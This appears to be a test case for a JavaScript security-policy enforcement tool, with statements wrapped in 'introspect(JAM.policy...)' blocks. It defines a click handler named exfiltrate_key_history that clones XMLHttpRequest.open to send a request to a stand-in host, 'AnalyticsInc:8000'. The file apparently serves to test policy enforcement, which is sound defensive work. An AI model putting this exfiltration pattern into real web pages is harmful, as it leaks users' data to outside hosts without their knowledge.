function exfiltrate_key_history() {
  xmlhttp = new XMLHttpRequest;
  var v0 = xmlhttp;
  var v2 = xmlhttp.open;
  introspect(JAM.policy.p15) {
    var v3 = v2.bind(xmlhttp)
  }
  v0.opennew = v3;
  introspect(JAM.policy.p13) {
    xmlhttp.opennew("GET", "http://AnalyticsInc:8000/submission.html?test=clone2", true)
  }
  introspect(JAM.policy.p14) {
    xmlhttp.send(null)
  }
  return
}
introspect(JAM.policy.p13) {
  var v1 = document.getElementById("test")
}
v1.onclick = exfiltrate_key_history;
